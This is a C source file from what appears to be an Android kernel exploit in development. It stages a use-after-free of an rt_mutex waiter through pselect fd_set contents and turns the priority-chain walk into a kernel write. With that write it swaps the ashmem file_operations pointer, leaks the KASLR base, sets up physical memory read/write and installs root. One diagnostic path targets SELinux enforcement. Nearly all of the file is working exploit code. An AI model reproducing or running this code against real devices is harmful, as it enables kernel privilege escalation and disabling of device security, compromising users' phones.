#include "common.h"

#define PSELECT_CFI_ROUTE_ATTEMPTS 8
#define PSELECT_EXPECTED_READY 9

atomic_int cfi_stage_done;
ssize_t cfi_write_ret = -1;
ssize_t cfi_read_ret = -1;
ssize_t cfi_read_slot_ret = -1;
ssize_t cfi_owner_ret = -1;
ssize_t cfi_restore_ret = -1;
uint64_t fops_before;
uint64_t fops_after;
int cfi_attempts;
int pipe_stage_attempts;
int cfi_dirty_seen;
int cfi_last_step;
int cfi_last_errno;
int kaslr_done;
int kaslr_step;
uint64_t kaslr_fops_alias;
uint64_t kaslr_open_ptr;
uint64_t kaslr_ioctl_ptr;
uint64_t kaslr_mmap_ptr;
uint64_t kaslr_release_ptr;
uint64_t kaslr_show_fdinfo_ptr;
uint64_t kaslr_base;
uint64_t kaslr_slide;
uint64_t kaslr_expected_ioctl;
uint64_t kaslr_expected_mmap;
uint64_t kaslr_expected_release;
uint64_t kaslr_expected_show_fdinfo;
uint64_t slide_bootid_before;
uint64_t slide_bootid_after;
uint64_t slide_bootid_want;
ssize_t slide_bootid_restore_ret = -1;

static int route_delay_usec(int attempt) {
  int default_delay = pselect_custom_write_enabled() ? 0 : -1;
  int override = env_int_range("PSELECT_ROUTE_DELAY_USEC",
                               default_delay, -1, 1000000);
  if (override >= 0) {
    return override;
  }

  static const int delays[] = {
    50000, 30000, 70000, 10000, 100000, 150000, 20000, 120000,
  };

  int count = (int)(sizeof(delays) / sizeof(delays[0]));
  return delays[(attempt - 1) % count];
}

void fdset_put_word(fd_set *set, int word, uint64_t value) {
  unsigned long *bits = (unsigned long *)set;
  bits[word] = (unsigned long)value;
}

uint64_t fdset_get_word(const fd_set *set, int word) {
  const unsigned long *bits = (const unsigned long *)set;
  return bits[word];
}

static int pselect_words_per_set(void) {
  int bits_per_word = (int)(8 * sizeof(unsigned long));
  return (PSELECT_ROUTE_NFDS + bits_per_word - 1) / bits_per_word;
}

static int pselect_put_global_word(
    fd_set *in, fd_set *out, fd_set *ex, int words_per_set,
    int global_word, uint64_t value) {
  if (global_word < 0) {
    return 0;
  }

  int set_idx = global_word / words_per_set;
  int word_idx = global_word % words_per_set;
  switch (set_idx) {
    case 0:
      fdset_put_word(in, word_idx, value);
      return 1;
    case 1:
      fdset_put_word(out, word_idx, value);
      return 1;
    case 2:
      fdset_put_word(ex, word_idx, value);
      return 1;
    default:
      return 0;
  }
}

/* Runtime fake-waiter shift, swept across attempts (see do_pselect_fake_lock_route).
 * shift=-2 lands the overlay BELOW the freed rt_waiter (tree_entry/lock read from
 * residual real data -> survives, but RB_EMPTY_NODE early-returns -> no write). The
 * aligning shift (overlay word0 lands on rt_waiter+0) is unknown; sweep [-2..+2]
 * (buffer floor -2 / ceil +2 for 11 words 2..12) to find it. */
int pselect_runtime_shift = PSELECT_WAITER_WORD_SHIFT;

static void pselect_put_waiter_word(
    fd_set *in, fd_set *out, fd_set *ex, int words_per_set,
    int waiter_word, uint64_t value, const char *name) {
  int global_word = waiter_word + pselect_runtime_shift;
  int placed = pselect_put_global_word(
      in, out, ex, words_per_set, global_word, value);
  if (!placed) {
    pr_warning("pselect cannot place %s waiter_word=%d global_word=%d "
               "words_per_set=%d nfds=%d\n",
               name, waiter_word, global_word, words_per_set,
               PSELECT_ROUTE_NFDS);
  }
}

void open_selected_fds(
    fd_set *in, fd_set *out, fd_set *ex, int read_fd, int write_fd) {
  (void)write_fd;

  int high_read = fcntl(read_fd, F_DUPFD, PSELECT_ROUTE_NFDS + 32);
  if (high_read < 0) {
    pr_warning("pselect F_DUPFD read errno=%d\n", errno);
    return;
  }
  for (int fd = 0; fd < PSELECT_ROUTE_NFDS; fd++) {
    if (FD_ISSET(fd, in) || FD_ISSET(fd, out) || FD_ISSET(fd, ex)) {
      dup2(high_read, fd);
    }
  }
  close(high_read);
  dup2(read_fd, PSELECT_ROUTE_NFDS - 1);
  FD_SET(PSELECT_ROUTE_NFDS - 1, ex);
}

void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
  FD_ZERO(in);
  FD_ZERO(out);
  FD_ZERO(ex);

  if (env_flag("PSELECT_SIMPLE_LAYOUT", 0)) {
    fdset_put_word(in, 0, fake_w0);
    fdset_put_word(in, 3, 0);
    fdset_put_word(ex, 0,
                   pselect_custom_write_enabled() ? fake_task :
                   text_addr(INIT_TASK));
    fdset_put_word(ex, 1, fake_lock);
    fdset_put_word(ex, 2, 3);
    fdset_put_word(ex, 3, 0);
    return;
  }

  int words_per_set = pselect_words_per_set();
  struct pselect_waiter_word {
    int word;
    uint64_t value;
    const char *name;
  } words[] = {
    {2, pselect_write_value(), "tree_pc"},
    {3, 0, "tree_right"},
    {4, pselect_write_target(), "tree_left"},
    {5, pselect_write_value(), "pi_parent"},
    {6, 0, "pi_right"},
    {7, pselect_write_target(), "pi_left"},
    {8, pselect_custom_write_enabled() ? fake_task : text_addr(INIT_TASK),
     "task"},
    {9, fake_lock, "lock"},
    {10, ((uint64_t)FAKE_WAITER_PRIO << 32) | 3, "wake_prio"},
    {11, 0, "deadline"},
    {12, 0, "ww_ctx"},
  };
  for (size_t i = 0; i < sizeof(words) / sizeof(words[0]); i++) {
    struct pselect_waiter_word *w = &words[i];
    pselect_put_waiter_word(
        in, out, ex, words_per_set, w->word, w->value, w->name);
  }
}

/* QEMU-gdb PROVED shift=-2 is exactly correct (rt_waiter == stack_fds ==
 * SP_DIV-0x210, measured in the device kernel: fake-waiter word0 at stack_fds+0
 * lands on rt_waiter+0). So the sweep is fixed at -2 now; the walk_wrote=0 blocker
 * is NOT the shift. (Infra kept for future re-sweeps; add values to re-enable.) */
static const int kShiftSweep[] = {-2};
#define SHIFT_SWEEP_N ((int)(sizeof(kShiftSweep) / sizeof(kShiftSweep[0])))

static void shift_idx_path(char *out, size_t n) {
  const char *log = getenv("POC_LOG_FILE");
  if (log && log[0]) {
    snprintf(out, n, "%s.shiftidx", log);
  } else {
    snprintf(out, n, "/data/local/tmp/aristotle_shiftidx");
  }
}

static int shift_idx_load(void) {
  char path[288];
  shift_idx_path(path, sizeof(path));
  int fd = open(path, O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    return 0;
  }
  char buf[16] = {0};
  ssize_t r = read(fd, buf, sizeof(buf) - 1);
  close(fd);
  if (r <= 0) {
    return 0;
  }
  int v = atoi(buf);
  if (v < 0) {
    v = 0;
  }
  return v % SHIFT_SWEEP_N;
}

static void shift_idx_store(int next) {
  char path[288];
  shift_idx_path(path, sizeof(path));
  int fd = open(path, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0600);
  if (fd < 0) {
    return;
  }
  char buf[16];
  int n = snprintf(buf, sizeof(buf), "%d", next % SHIFT_SWEEP_N);
  if (n > 0) {
    (void)!write(fd, buf, (size_t)n);
    fsync(fd);
  }
  close(fd);
}

void do_pselect_fake_lock_route(void) {
  /* Durable entry checkpoint: proves the waiter actually reached the
   * pselect route (the setup pr_info below is NOT fsync'd and is lost on
   * a panic reboot). */
  pr_success("ckpt: do_pselect enter page=%016zx lock=%016zx fops=%016zx\n",
             page_base, fake_lock, fake_fops);
  if (!page_base || !fake_lock || !fake_fops) {
    cfi_last_step = 30;
    cfi_last_errno = 0;
    pr_error("pselect route missing kernel page base=%016zx lock=%016zx fops=%016zx\n",
             page_base, fake_lock, fake_fops);
    return;
  }

  int calls = 0;
  int success = 0;
  int route_verified = 0;
  int signal_miss_retry = 0;
  int sweep_idx = shift_idx_load();
  for (int route_attempt = 1; route_attempt <= PSELECT_CFI_ROUTE_ATTEMPTS;
       route_attempt++) {
    /* Pick the next shift and PERSIST the following index (fsync) BEFORE arming,
     * so if this shift Oopses the kernel the reboot resumes at the next one. A
     * signal-miss retry reuses the same shift (no walk happened). */
    if (!signal_miss_retry) {
      pselect_runtime_shift = kShiftSweep[sweep_idx % SHIFT_SWEEP_N];
      shift_idx_store((sweep_idx + 1) % SHIFT_SWEEP_N);
      sweep_idx++;
    }
    /* On a signal-miss retry the payload page is still intact (no write
     * happened), so skip the expensive re-groom and just re-run pselect. */
    if (route_attempt != 1 && !signal_miss_retry) {
      page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
      if (!page_base || !fake_lock || !fake_fops) {
        cfi_last_step = 34;
        cfi_last_errno = errno;
        pr_error("pselect retry page prepare failed attempt=%d base=%016zx "
                 "lock=%016zx fops=%016zx\n",
                 route_attempt, page_base, fake_lock, fake_fops);
        break;
      }
    }
    signal_miss_retry = 0;

    int pipefd[2];
    SYSCHK(pipe(pipefd));
    int block_fd = (int)syscall(SYS_timerfd_create, CLOCK_MONOTONIC, 0);
    if (block_fd < 0) {
      pr_warning("pselect timerfd_create failed errno=%d; using pipe read end\n",
                 errno);
      block_fd = pipefd[0];
    }
    int high_read = fcntl(block_fd, F_DUPFD, PSELECT_ROUTE_NFDS + 16);
    if (high_read < 0) {
      cfi_last_step = 31;
      cfi_last_errno = errno;
      pr_error("pselect F_DUPFD read errno=%d\n", errno);
      if (block_fd != pipefd[0]) {
        close(block_fd);
      }
      close(pipefd[0]);
      close(pipefd[1]);
      break;
    }

    fd_set in;
    fd_set out;
    fd_set ex;
    prepare_pselect_fdsets(&in, &out, &ex);
    pr_info("pselect route setup attempt=%d simple=%d page=%016zx "
            "fake_lock=%016zx fake_w0=%016zx fake_task=%016zx "
            "in0=%016llx in3=%016llx out0=%016llx ex0=%016llx "
            "ex1=%016llx ex2=%016llx ex3=%016llx\n",
            route_attempt,
            env_flag("PSELECT_SIMPLE_LAYOUT", 0),
            page_base, fake_lock, fake_w0, fake_task,
            (unsigned long long)fdset_get_word(&in, 0),
            (unsigned long long)fdset_get_word(&in, 3),
            (unsigned long long)fdset_get_word(&out, 0),
            (unsigned long long)fdset_get_word(&ex, 0),
            (unsigned long long)fdset_get_word(&ex, 1),
            (unsigned long long)fdset_get_word(&ex, 2),
            (unsigned long long)fdset_get_word(&ex, 3));
    open_selected_fds(&in, &out, &ex, high_read, pipefd[1]);

    atomic_store(&consumer_calls, 0);
    atomic_store(&consumer_success, 0);
    atomic_store(&punch_consume_stop, 0);
    atomic_store(&pselect_armed, 0);
    int delay_usec = route_delay_usec(route_attempt);
    atomic_store(&main_route_delay_usec, delay_usec);

    struct timespec timeout = {
      .tv_sec = PSELECT_TIMEOUT_SEC,
      .tv_nsec = 0,
    };
    struct timespec *timeoutp = &timeout;

    /* Durable bracket around the danger zone: while pselect() blocks with the
     * fake rt_mutex overlay installed, the consumer fires sched_setattr on the
     * waiter tid, driving rt_mutex_adjust_prio_chain across our overlay words.
     * "arming" for attempt N with no matching "survived" == that attempt
     * panicked the kernel.
     * Log BEFORE releasing the consumer: pr_success fsyncs to /data, which can
     * take tens of ms, and it used to sit between punch_consume_go and the
     * syscall -- long enough for the consumer's fixed delay to expire and the
     * walk to fire on the pre-pselect stack. The consumer now waits on
     * pselect_armed, which is stored as the last thing before the syscall. */
    pr_success("ckpt: pselect attempt=%d arming shift=%d target=%016llx "
               "(bootid_proof=%d)\n",
               route_attempt, pselect_runtime_shift,
               (unsigned long long)pselect_write_target(), bootid_proof_active);
    atomic_store(&punch_consume_go, route_attempt);
    errno = 0;
    atomic_store(&pselect_armed, 1);
    int ret = pselect(PSELECT_ROUTE_NFDS, &in, &out, &ex, timeoutp, NULL);
    int saved_errno = errno;
    atomic_store(&pselect_armed, 0);
    atomic_store(&punch_consume_go, 0);
    pr_success("ckpt: pselect attempt=%d survived ret=%d errno=%d calls=%d "
               "walks=%d\n",
               route_attempt, ret, saved_errno, atomic_load(&consumer_calls),
               atomic_load(&consumer_success));

    /* BOOTID-WRITE-PROOF: the store was aimed at &sysctl_bootid, so boot_id
     * changing == the chain-walk rb-erase store provably executes on this
     * device. Read as:
     *   walks>=1 walk_wrote=1 => primitive OK; next blocker is the KASLR leak.
     *   walks>=1 walk_wrote=0 => the walk ran ON the overlay and still did not
     *                            store (next suspect: the P0_DATA_ALIAS delta,
     *                            although lk.img+vendor_boot say delta==0).
     *   walks=0              => the trigger, not the store, is still at fault.
     * This build deliberately NEVER attempts the &ashmem_misc.fops swap: the
     * fake fops table is still built from text_addr(), and text_addr() currently
     * resolves through the kaslr_base PLACEHOLDER (main.c sets
     * P0_PAGE_OFFSET+P0_KERNEL_PHYS_LOAD). Those are linear-map aliases, which
     * arm64 maps PXN -- so the moment the swap lands, misc_open()'s
     * `file->f_op->open()` would fetch instructions from a non-executable alias
     * and panic. The real KASLR base has to be leaked first (copy-shape overlay:
     * read *&ashmem_misc.fops, which holds the SLID &ashmem_fops, into
     * sysctl_bootid and read it out of /proc). So every attempt here stays on the
     * harmless bootid target. */
    if (bootid_proof_active) {
      char bootid_after[64] = "?";
      read_first_line("/proc/sys/kernel/random/boot_id", bootid_after,
                      sizeof(bootid_after));
      int wrote = strcmp(bootid_after, bootid_proof_before) != 0;
      pr_success("ckpt: BOOTID-WRITE-PROOF attempt=%d walks=%d before=%s "
                 "after=%s walk_wrote=%d\n",
                 route_attempt, atomic_load(&consumer_success),
                 bootid_proof_before, bootid_after, wrote);
      close(high_read);
      if (block_fd != pipefd[0]) {
        close(block_fd);
      }
      close(pipefd[0]);
      close(pipefd[1]);
      if (wrote) {
        pr_success("ckpt: BOOTID-WRITE-PROOF POSITIVE attempt=%d — the chain-walk "
                   "store WORKS (target=%016llx). Stopping before the fops swap on "
                   "purpose (unslid fake-fops text ptrs would panic misc_open); "
                   "next build leaks the real KASLR base.\n",
                   route_attempt, (unsigned long long)data_addr(SYSCTL_BOOTID));
        atomic_store(&punch_consume_stop, 1);
        cfi_last_step = 0;
        break;
      }
      continue;
    }

    /* ENFORCING_WRITE_DIAG: the rb-erase store is aimed at
     * &selinux_state.enforcing. Check getenforce right after each walk so the
     * proof lands early and the noisy remaining attempts are skipped. A flip to
     * "0" is the decisive "the dequeue store executes on-device" signal. */
    if (enforcing_write_diag_enabled()) {
      char enf[32] = "?";
      read_first_line("/sys/fs/selinux/enforce", enf, sizeof(enf));
      pr_success("ckpt: WRITE-PROOF attempt=%d enforce=%s walk_wrote=%d\n",
                 route_attempt, enf, (int)(enf[0] == '0'));
      if (enf[0] == '0') {
        pr_success("ckpt: WRITE-PROOF POSITIVE attempt=%d — rb-erase store LANDED "
                   "(walk writes on-device); remaining bug is fops target/method\n",
                   route_attempt);
        atomic_store(&punch_consume_stop, 1);
        close(high_read);
        if (block_fd != pipefd[0]) {
          close(block_fd);
        }
        close(pipefd[0]);
        close(pipefd[1]);
        break;
      }
    }
    calls = atomic_load(&consumer_calls);
    success = atomic_load(&consumer_success);
    pr_info("pselect returned attempt=%d ret=%d errno=%d calls=%d success=%d delay=%d\n",
            route_attempt, ret, saved_errno, calls, success, delay_usec);

    int route_quality_miss = 0;
    int route_signal = calls > 0 && success > 0;
    int cfi_probed = 0;
    if (route_signal) {
      cfi_probed = 1;
      if (ret != PSELECT_EXPECTED_READY) {
        pr_info("pselect route probing cfi attempt=%d ret=%d expected=%d\n",
                route_attempt, ret, PSELECT_EXPECTED_READY);
      }
      if (pselect_custom_write_enabled()) {
        cfi_last_step = 0;
        cfi_last_errno = 0;
        route_verified = 1;
      } else if (try_cfi_stage()) {
        cfi_last_step = 0;
        route_verified = 1;
      } else if (!cfi_last_step) {
        cfi_last_step = 32;
      }
    }
    /* Durable per-attempt sweep result ([+], flood-free). success=1 => the walk
     * actually fired; landed=1 (configfs write != EINVAL) => the fops swap took
     * at THIS shift => this is the aligning shift and root proceeds. */
    pr_success("ckpt: SWEEP attempt=%d shift=%d success=%d landed=%d cfi_write_ret=%zd\n",
               route_attempt, pselect_runtime_shift, success,
               (int)(route_signal && cfi_write_ret > 0), cfi_write_ret);
    if (!route_verified && route_signal) {
      route_quality_miss = 1;
      if (!cfi_probed) {
        cfi_last_step = 35;
        cfi_last_errno = saved_errno;
      }
      pr_info("pselect route quality miss attempt=%d/%d ret=%d expected=%d delay=%d; refreshing FOPS page\n",
              route_attempt, PSELECT_CFI_ROUTE_ATTEMPTS, ret,
              PSELECT_EXPECTED_READY, delay_usec);
    } else if (!route_verified) {
      cfi_last_step = 33;
      cfi_last_errno = saved_errno;
    }

    close(high_read);
    if (block_fd != pipefd[0]) {
      close(block_fd);
    }
    close(pipefd[0]);
    close(pipefd[1]);

    if (route_quality_miss) {
      continue;
    }
    if (!route_verified && !route_signal &&
        route_attempt < PSELECT_CFI_ROUTE_ATTEMPTS) {
      /* Consumer lost the sched_setattr race this attempt (calls=%d success=0):
       * the walk didn't fire a successful adjust, so the CFI stage was skipped
       * (step=33). This is racy run-to-run (a prior build hit success=1 on the
       * same setup), so retry the whole route with a fresh pselect/reclaim
       * instead of giving up after one unlucky attempt. */
      pr_info("pselect route signal miss attempt=%d/%d calls=%d success=%d; retrying\n",
              route_attempt, PSELECT_CFI_ROUTE_ATTEMPTS, calls, success);
      signal_miss_retry = 1;
      continue;
    }
    if (route_verified || cfi_dirty_seen || cfi_last_step != 1) {
      break;
    }
    pr_info("pselect cfi write miss attempt=%d/%d errno=%d; refreshing FOPS page\n",
            route_attempt, PSELECT_CFI_ROUTE_ATTEMPTS, cfi_last_errno);
  }
  pr_info("pselect route done calls=%d success=%d step=%d errno=%d\n",
          calls, success, cfi_last_step, cfi_last_errno);
}

int repair_fake_fops_llseek(int fd) {
  uint64_t llseek = text_addr(NOOP_LLSEEK);
  uint64_t after = 0;
  uintptr_t slot = fake_fops + FOPS_LLSEEK_OFF;
  ssize_t wr = configfs_write_once(fd, slot, &llseek, sizeof(llseek));
  ssize_t rd = configfs_read_once(fd, slot, &after, sizeof(after));
  return wr == (ssize_t)sizeof(llseek) &&
         rd == (ssize_t)sizeof(after) &&
         after == llseek;
}

int refresh_fake_fops_text(int fd) {
  struct fops_slot {
    size_t off;
    uint64_t value;
  } slots[] = {
    {FOPS_READ_OFF, text_addr(CONFIGFS_READ_BIN)},
    {FOPS_WRITE_OFF, text_addr(CONFIGFS_WRITE_BIN)},
    {FOPS_READ_ITER_OFF, 0},
    {FOPS_WRITE_ITER_OFF, 0},
    {FOPS_IOCTL_OFF, text_addr(ASHMEM_IOCTL)},
    {FOPS_COMPAT_IOCTL_OFF, text_addr(ASHMEM_COMPAT_IOCTL)},
    {FOPS_MMAP_OFF, text_addr(ASHMEM_MMAP)},
    {FOPS_OPEN_OFF, text_addr(ASHMEM_OPEN)},
    {FOPS_RELEASE_OFF, text_addr(ASHMEM_RELEASE)},
    {FOPS_SPLICE_READ_OFF, text_addr(COPY_SPLICE_READ)},
    {FOPS_SHOW_FDINFO_OFF, text_addr(ASHMEM_SHOW_FDINFO)},
  };

  for (size_t i = 0; i < sizeof(slots) / sizeof(slots[0]); i++) {
    uintptr_t target = fake_fops + slots[i].off;
    if (kernel_write_data(fd, target, &slots[i].value,
        sizeof(slots[i].value)) !=
        (ssize_t)sizeof(slots[i].value)) {
      return 0;
    }
  }
  return 1;
}

int leak_kernel_base(int fd) {
  kaslr_fops_alias = p0_data_alias(ASHMEM_FOPS);
  kaslr_open_ptr = kernel_read64(fd, kaslr_fops_alias + FOPS_OPEN_OFF);
  kaslr_ioctl_ptr = kernel_read64(fd, kaslr_fops_alias + FOPS_IOCTL_OFF);
  kaslr_mmap_ptr = kernel_read64(fd, kaslr_fops_alias + FOPS_MMAP_OFF);
  kaslr_release_ptr = kernel_read64(fd, kaslr_fops_alias + FOPS_RELEASE_OFF);
  kaslr_show_fdinfo_ptr =
    kernel_read64(fd, kaslr_fops_alias + FOPS_SHOW_FDINFO_OFF);

  if (!is_kernel_ptr(kaslr_open_ptr) || !is_kernel_ptr(kaslr_ioctl_ptr) ||
      !is_kernel_ptr(kaslr_mmap_ptr) || !is_kernel_ptr(kaslr_release_ptr) ||
      !is_kernel_ptr(kaslr_show_fdinfo_ptr)) {
    kaslr_step = 1;
    return 0;
  }

  kaslr_base = kaslr_open_ptr - (ASHMEM_OPEN - KIMAGE_TEXT_BASE);
  kaslr_slide = kaslr_base - KIMAGE_TEXT_BASE;
  kaslr_done = 1;
  kaslr_expected_ioctl = text_addr(ASHMEM_IOCTL);
  kaslr_expected_mmap = text_addr(ASHMEM_MMAP);
  kaslr_expected_release = text_addr(ASHMEM_RELEASE);
  kaslr_expected_show_fdinfo = text_addr(ASHMEM_SHOW_FDINFO);

  if (kaslr_ioctl_ptr != kaslr_expected_ioctl ||
      kaslr_mmap_ptr != kaslr_expected_mmap ||
      kaslr_release_ptr != kaslr_expected_release ||
      kaslr_show_fdinfo_ptr != kaslr_expected_show_fdinfo) {
    kaslr_done = 0;
    kaslr_step = 2;
    return 0;
  }

  if (!refresh_fake_fops_text(fd)) {
    kaslr_done = 0;
    kaslr_step = 3;
    return 0;
  }

  kaslr_step = 0;
  return 1;
}

int restore_slide_boot_id(int fd) {
  return 0;  // slide bypassed
}

int install_child_root(int fd) {
  return install_pipe_physrw(fd) && install_android_root(fd);
}

int try_cfi_stage(void) {
  cfi_attempts++;
  int fd = open_ashmem_device();
  int dirty = 0;
  int can_read_back = 0;

  if (fd < 0) {
    cfi_last_step = 11;
    cfi_last_errno = errno;
    pr_info("cfi open failed path=%s errno=%d\n", ashmem_path, errno);
    return 0;
  }

  pr_info("cfi attempt=%d fd=%d path=%s fake_fops=%016zx target=%016zx "
          "ioctl=%016llx open=%016llx write=%016llx read=%016llx\n",
          cfi_attempts, fd, ashmem_path, fake_fops, binwrite_target,
          (unsigned long long)text_addr(ASHMEM_IOCTL),
          (unsigned long long)text_addr(ASHMEM_OPEN),
          (unsigned long long)text_addr(CONFIGFS_WRITE_BIN),
          (unsigned long long)text_addr(CONFIGFS_READ_BIN));

  uintptr_t misc_fops = data_addr(ASHMEM_MISC_FOPS);
  /* Swap-landing diagnostic: read miscdevice.fops via the (now fake) .read
   * method. If it reads back fake_fops, the GhostLock fops swap is in effect on
   * this fd; if not, the fd is still on real ashmem_fops (rb write didn't stick).
   * FMODE_CAN_READ is set regardless (ashmem has read_iter), so pread routes to
   * fake_fops->read only when the swap landed. */
  {
    uint64_t swap_chk = 0;
    errno = 0;
    ssize_t sr = configfs_read_once(fd, misc_fops, &swap_chk, sizeof(swap_chk));
    pr_info("cfi swap-check read_ret=%zd errno=%d misc_fops[%016zx]=%016llx "
            "want_fake_fops=%016zx landed=%d\n",
            sr, errno, misc_fops, (unsigned long long)swap_chk, fake_fops,
            (int)(swap_chk == (uint64_t)fake_fops));
  }

  /* SCRATCH_WRITE_DIAG: the rb-erase write was redirected to a page scratch;
   * recv the reclaim sk_buffs (= the page) and diff vs the sent payload to prove
   * whether the dequeue write lands at all (non-circular, no configfs needed). */
  if (scratch_write_diag_enabled()) {
    scratch_diag_readback((uint64_t)pselect_write_value());
  }
  char payload[] = "CFI_FRIENDLY_CONFIGFS_BIN_WRITE_OK";
  ssize_t n =
    configfs_write_once(fd, binwrite_target, payload, sizeof(payload));
  cfi_write_ret = n;
  pr_info("cfi write ret=%zd errno=%d\n", n, errno);
  if (n != (ssize_t)sizeof(payload)) {
    cfi_last_step = 1;
    cfi_last_errno = errno;
    goto fail;
  }
  dirty = 1;
  cfi_dirty_seen = 1;

  if (!repair_fake_fops_llseek(fd)) {
    cfi_last_step = 2;
    cfi_last_errno = errno;
    goto fail;
  }
  cfi_read_slot_ret = sizeof(uint64_t);
  can_read_back = 1;

  char readback[sizeof(payload)];
  memset(readback, 0, sizeof(readback));
  ssize_t r =
    configfs_read_once(fd, binwrite_target, readback, sizeof(readback));
  cfi_read_ret = r;
  pr_info("cfi read ret=%zd errno=%d\n", r, errno);
  if (r != (ssize_t)sizeof(readback) ||
      memcmp(readback, payload, sizeof(payload)) != 0) {
    cfi_last_step = 3;
    cfi_last_errno = errno;
    goto fail;
  }

  uint64_t before = 0;
  ssize_t rb = configfs_read_once(fd, misc_fops, &before, sizeof(before));
  fops_before = before;
  pr_info("cfi fops_before ret=%zd value=%016llx want=%016zx errno=%d\n",
          rb, (unsigned long long)before, fake_fops, errno);
  if (rb != (ssize_t)sizeof(before) || before != fake_fops) {
    cfi_last_step = 4;
    cfi_last_errno = errno;
    goto fail;
  }

  if (!restore_slide_boot_id(fd)) {
    cfi_last_step = 10;
    cfi_last_errno = errno;
    goto fail;
  }

  if (!leak_kernel_base(fd)) {
    cfi_last_step = 9;
    cfi_last_errno = errno;
    goto fail;
  }

  int installed = 0;
  pipe_stage_attempts = 0;
  for (int attempt = 0; attempt < PIPE_MAX_ATTEMPTS; attempt++) {
    pipe_stage_attempts++;
    if (attempt != 0) {
      reset_pipe_attempt();
    }
    if (install_child_root(fd)) {
      installed = 1;
      break;
    }
    if (pipe_cache_gate_ok && physrw_read_ok && physrw_write_ok &&
        physrw_read64_ok && physrw_write64_ok) {
      break;
    }
  }

  if (!installed) {
    cfi_last_step = 8;
    cfi_last_errno = errno;
    goto fail;
  }

  uint64_t original_fops = canon_addr(ASHMEM_FOPS);
  ssize_t restore = configfs_write_once(
      fd, misc_fops, &original_fops, sizeof(original_fops));
  cfi_restore_ret = restore;
  if (restore != (ssize_t)sizeof(original_fops)) {
    cfi_last_step = 5;
    cfi_last_errno = errno;
    goto fail;
  }

  uint64_t after = 0;
  ssize_t ra = configfs_read_once(fd, misc_fops, &after, sizeof(after));
  fops_after = after;
  if (ra != (ssize_t)sizeof(after) || after != canon_addr(ASHMEM_FOPS)) {
    cfi_last_step = 6;
    cfi_last_errno = errno;
    goto fail;
  }

  uint64_t null_owner = 0;
  ssize_t owner =
    configfs_write_once(fd, fake_fops, &null_owner, sizeof(null_owner));
  cfi_owner_ret = owner;
  SYSCHK(close(fd));
  if (owner == (ssize_t)sizeof(null_owner) &&
      restore == (ssize_t)sizeof(original_fops)) {
    cfi_last_step = 0;
    cfi_last_errno = 0;
    atomic_store(&cfi_stage_done, 1);
    return 1;
  }
  cfi_last_step = 7;
  cfi_last_errno = errno;
  return 0;

fail:
  if (dirty) {
    uint64_t original_fops_fail = p0_data_alias(ASHMEM_FOPS);
    if (kaslr_done) {
      original_fops_fail = canon_addr(ASHMEM_FOPS);
    }
    cfi_restore_ret = configfs_write_once(
        fd, misc_fops, &original_fops_fail, sizeof(original_fops_fail));
    if (can_read_back &&
        cfi_restore_ret == (ssize_t)sizeof(original_fops_fail)) {
      uint64_t after_fail = 0;
      if (configfs_read_once(fd, misc_fops, &after_fail, sizeof(after_fail)) ==
          (ssize_t)sizeof(after_fail)) {
        fops_after = after_fail;
      }
    }
    uint64_t null_owner_fail = 0;
    cfi_owner_ret = configfs_write_once(
        fd, fake_fops, &null_owner_fail, sizeof(null_owner_fail));
  }
  SYSCHK(close(fd));
  return 0;
}
